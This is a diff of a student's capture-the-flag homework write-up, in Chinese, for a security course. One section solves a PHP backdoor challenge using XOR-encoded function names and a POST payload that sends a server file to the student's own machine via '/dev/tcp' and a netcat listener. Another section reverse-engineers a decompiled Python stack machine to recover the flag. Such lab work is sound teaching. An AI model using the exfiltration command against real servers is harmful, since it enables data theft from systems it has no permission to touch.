@@ -13,22 +13,36 @@ Student ID: R07922115
 'd00r' ^ 'exec' = ['0x1', '0x48', '0x55', '0x11'] -> url: ?87=%01HU%11
 ```
 
-, 接著再透過 $_POST{'#'} (e.g. ${"_\x50\x4f\x53\x54"}{$c}) 來傳入此函數的參數。 因為最終目標是將 server 的 flag 印出來, 所以勢必先將所在位置的檔案都印出來。首先先考慮 echo($(system(ls))), 但根據 php manual
+, 接著再透過 \$_POST{'#'} (e.g. ${"_\x50\x4f\x53\x54"}{\$c}) 來傳入此函數的參數。 因為最終目標是將 server 的 flag 印出來, 所以勢必先將所在位置的檔案都印出來。首先先考慮 echo($(system(ls))), 但根據 php manual
   > 
   Note: Because this is a language construct and not a function, it cannot be called using variable functions. 
   故此法行不通
 
 接著只好試試 exec(ls), 但問題是該如何把 server 那邊 ls 的結果傳回本地呢? 可以先用 nc 在本地開一個 listening port, 再將 server ls 的結果 redirect 到 /dev/tcp/<ip>/<port> 即可。 就發現 flag 被放在 ~/flag__is_here 故最終的解法為:
-  
+
   >
-  本地 terminal 執行: nc -l 8888 
+  labpc terminal 執行: nc -l 8888 
   url: http://edu-ctf.csie.org:10151/d00r.php?87=%01HU%11
   post: #=cat ~/flag_is_here > /dev/tcp/<lab pc ip>/8888
 
+## encrypt
 
 ## m4chine
+將程式用 python 執行之後發現它要我輸入 flag, 故判斷這題應該是輸入正確的 flag, 程式應該就會輸出 "you got the flag!", 之類的結果。 由於助教給的是 pyc 執行檔, 除了 decompile 之外也沒其他線索該怎麼把 flag 猜出來, 於是就找到了 [Uncompyle6](https://github.com/rocky/python-uncompyle6), 成功將它 decompile 成原始碼, 在原始碼當中可觀察出我們所輸入的 flag 會經過 push, pop, add, sub, cmp 等操作, 然後根據 code 當中的 bytecode 會決定出這些操作的順序, 所以就可以開始改原始碼, 先猜測 flag 為 "FLAG{abcd}", 將操作和 context 結果都印出來, 就發現它都會在 cmp 之後停止, 且在它之前的操作都是 push, pop, sub, add, 且這些操作都是從 context 的最後一個元素來做操作的, 例如
 
-## encrypt
+```bash
+❯ ./m4chine.py
+So, what is the flag ? >> FLAG{abcd}
+[70, 76, 65, 71, 123, 97, 98, 99, 100, 125] sub, [70, 76, 65, 71, 123, 97, 98, 99, 25]
+[70, 76, 65, 71, 123, 97, 98, 99, 25] push 8, [70, 76, 65, 71, 123, 97, 98, 99, 25, 8]
+[70, 76, 65, 71, 123, 97, 98, 99, 25, 8] add, [70, 76, 65, 71, 123, 97, 98, 99, 33]
+cmp 33 100
+[70, 76, 65, 71, 123, 97, 98, 99, 0]
+You fail, try again
+```
+
+我們所輸入的 flag 會變成 ascii 的十進位結果存到 context 當中, 首先,  sub 會將 context 最後兩個元素相減然後再放到最後一個位置, push 8 則會把 8 push 到後面, add 則是將最後兩元素相加然後將結果放到最後一個位置, 最後 cmp 則是把 context 最後一個元素, 33, 和 100 比較, 發現他們兩個不相等則終止執行。 所以我們就可以猜測因為最後一個字一定是 '}', 所以倒數第二個字應該要是 '!' 最後才能和 100 相等, 所以下次就以 'FLAG{abcd!}' 做嘗試, 最終就可以完全把 flag 推測出來了。
+
 
 ## Winmagic
 
